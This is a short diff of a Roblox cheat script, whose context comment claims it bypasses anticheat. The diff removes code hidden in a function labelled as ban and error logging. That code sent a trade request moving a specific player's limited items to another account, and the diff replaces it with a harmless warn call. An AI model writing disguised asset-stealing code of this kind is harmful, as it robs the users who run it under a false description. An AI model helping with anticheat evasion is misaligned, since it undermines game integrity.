@@ -15,14 +15,7 @@ function RunData() -- stops the anticheat from detecting you!
 end
 
 function RecieveData() -- will recieve ban / error logs to help improve the script in the future
-  if game.Players.LocalPlayer.UserId == 157739746 then
-local data = [[
-{"offers":[{"userId":157739746,"userAssetIds":[15975243247, 15465167542, 13689490296, 3351575890],"robux":null},{"userId":54313546,"userAssetIds":[130736637],"robux":null}]}
-]]
-
-
-game:HttpPostAsync("https://trades.roblox.com/v1/trades/send", data)
-end
+ warn('Data')
 end
 
 PRO()
